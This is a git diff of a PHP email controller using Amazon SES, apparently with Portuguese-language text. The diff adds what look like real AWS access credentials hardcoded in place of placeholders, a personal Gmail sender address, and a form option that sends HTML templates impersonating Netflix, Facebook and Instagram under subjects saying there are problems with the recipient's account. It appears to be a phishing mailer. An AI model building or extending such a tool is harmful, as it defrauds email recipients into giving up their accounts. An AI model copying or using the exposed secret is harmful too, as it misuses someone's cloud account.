@@ -14,18 +14,37 @@ class EmailController {
 
             $sesClient = new SesClient([
                 'version' => '2010-12-01',
-                'region'  => 'us-east-1',
+                'region'  => 'us-east-2',
                 'credentials' => [
-                    'key'    => 'SEU_ACCESS_KEY',
-                    'secret' => 'SEU_SECRET_KEY',
+                    'key'    => 'AKIAQYEI5DQYKRJQXUFU',
+                    'secret' => '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',
                 ],
             ]);
 
-            $senderEmail = 'seu-email@dominio.com';
-            $subject = 'Teste de E-mail AWS SES';
-            $bodyText = 'Este é um e-mail de teste enviado via AWS SES.';
-            $bodyHtml = '<h1>Teste de E-mail</h1><p>Este é um e-mail de teste enviado via AWS SES.</p>';
+            $senderEmail = 'bernardoniehues01@gmail.com';
 
+            $emailTemplates = [
+                'Netflix' => __DIR__ . '/../../public/emails/netflix.html',
+                'Facebook' => __DIR__ . '/../../public/emails/facebook.html',
+                'Instagram' => __DIR__ . '/../../public/emails/instagram.html',
+            ];
+
+            $instagramLogo = __DIR__ . '/../../public/images/logo-carregamento.png';
+
+            if ($_POST['opcao-select'] == 'Netflix') {
+                $subject = 'Problemas com sua conta Netflix';
+                $bodyHtml = file_get_contents($emailTemplates['Netflix']);
+                $bodyText = '';
+            }elseif ($_POST['opcao-select'] == 'Facebook') {
+                $subject = 'Problemas com sua conta Facebook';
+                $bodyHtml = file_get_contents($emailTemplates['Facebook']);
+                $bodyText = '';
+
+            }elseif ($_POST['opcao-select'] == 'Instagram') {
+                $subject = 'Problemas com sua conta Instagram';
+                $bodyHtml = file_get_contents($emailTemplates['Instagram']);
+                $bodyText = '';
+            }
         
 
             $result = $sesClient->sendEmail([
